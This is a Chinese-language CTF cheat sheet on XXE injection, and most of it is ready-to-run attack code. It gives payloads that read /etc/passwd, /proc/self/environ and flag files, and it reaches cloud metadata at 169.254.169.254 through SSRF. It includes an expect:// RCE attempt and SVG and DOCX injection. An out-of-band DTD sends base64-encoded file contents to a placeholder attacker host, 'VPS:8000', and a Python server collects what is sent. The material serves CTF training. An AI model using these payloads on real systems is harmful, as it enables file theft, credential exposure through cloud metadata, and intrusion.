---
title: XXE 外部实体注入（含 Blind OOB / SSRF 组合）
category: web
tags: [xxe, xml 外部实体, blind oob, ssrf]
signals: [xml 上传, soap 接口, 解析 xml 报错, doctype, 请求体是 xml, 文件读取, blind xxe, 有回显的 xml 解析, svg 上传, docx xlsx 解析]
difficulty: medium
source: "PortSwigger / PayloadsAllTheThings / OWASP"
tools: [python, burpsuite, xml 编辑器]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 接口 `Content-Type: application/xml` 或 `text/xml`，body 是 XML。
- 上传功能接受 `.svg`、`.docx`、`.xlsx`，后端用 libxml/dom4j 解析。
- 提交畸形 XML 返回解析错误（`DOCTYPE is disallowed`、`failed to load external entity`）。
- XML 内容里回显了你传入的实体 → 有回显 XXE。
- 关键词：XXE、DOCTYPE、ENTITY、xml、Blind。

## 二、原理

XML 支持自定义实体，而 `SYSTEM` 实体可以指向外部资源（文件/URL）：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>
```

解析器若未禁用外部实体，就会把 `/flag` 的内容读出来。利用分类：

| 类型 | 条件 | 手法 |
|---|---|---|
| 回显 XXE | 页面输出解析结果 | `file:///` 直读 |
| SSRF | 解析器会请求外部 URL | `http://127.0.0.1:6379/` |
| Blind OOB | 无回显但能出网 | 参数实体内嵌到 URL，`%xxe;` 触发外带 |
| Blind 报错 | 报错信息里含数据 | `error-based` 实体（libxml 特有） |

## 三、解题步骤

1. 找 XML 解析点（Content-Type、上传文件类型）。
2. 先测回显：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`。
3. 不行就测报错：`file:///nonexistent` 看错误信息。
4. 无回显 → OOB：在外部 DTD 里把文件内容拼进 `%xxe;` 的 URL。
5. 组合 SSRF：`SYSTEM "http://169.254.169.254/..."`。

## 四、可直接运行的脚本

回显 XXE（读文件）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
```

```bash
curl -s "http://TARGET/api/xml" -H "Content-Type: application/xml" -d @payload.xml
```

回显 XXE（SSRF 打内网 / 云元数据）：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<root>&xxe;</root>
```

PHP 的 `expect` 协议（RCE，库装 `expect` 时）：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<root>&xxe;</root>
```

OOB XXE（盲注，文件外带）：

```xml
<!-- 1. 攻击者服务器上的 evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://VPS:8000/?x=%file;'>">
%eval;
%exfil;
```

```xml
<!-- 2. 提交给目标的 payload -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://VPS:8000/evil.dtd"> %remote; ]>
<root>test</root>
```

```python
# 3. 攻击者服务器（同时托管 evil.dtd 并接收外带）
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

DTD = """<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://VPS:8000/?x=%file;'>">
%eval;
%exfil;"""

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("[REQ]", self.path, flush=True)
        if self.path.endswith(".dtd"):
            body = DTD.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/xml")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```

无外网时用"报错型 XXE"（libxml2）：

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexist/%file;'>">
%eval;
%error;
```

SVG / DOCX / XLSX 里的 XXE：

```xml
<!-- SVG 上传（很多图片处理库会解析） -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>
```

```bash
# DOCX/XLSX 是 zip，解压后改 word/document.xml 或 xl/sharedStrings.xml
unzip -o test.docx -d docx_x
# 在 word/document.xml 的 <w:t> 里注入实体，再 zip 回去上传
```

## 五、常见坑 / 变体

- **DTD 被禁用**：现代 libxml2（2.9+）默认禁用外部实体，Python 的 `lxml` 默认 `resolve_entities=False`；但仍可通过上传文件解析链（如 docx）触发。
- **`file://` 读不到但 `php://filter` 可以**：读 PHP 源码必须 base64 编码，否则页面会执行。
- **OOB 的实体嵌套**：`%file` 不能在参数实体里直接引用（XML 规范限制），必须借助 `eval` 二次构造（上面写法）。
- **回显被 XML 转义**：内容里有 `<`/`&` 时用 CDATA 或 base64。
- **外带 URL 里有 `%`**：base64 内容含 `+/=`，需要 `&` 编码或用 hex。
- 变体：**XXE + SSRF + gopher** 打 Redis。
- 变体：**盲 XXE 的响应只有 200/500** → 用 OOB DNS。
- 变体：**JSON 接口其实也支持 XML**（Spring 的 `Content-Type` 混用）。

## 六、参考来源

- [PortSwigger Web Security Academy - XXE injection](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [OWASP - XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 2021 - A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [HackTricks - XXE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
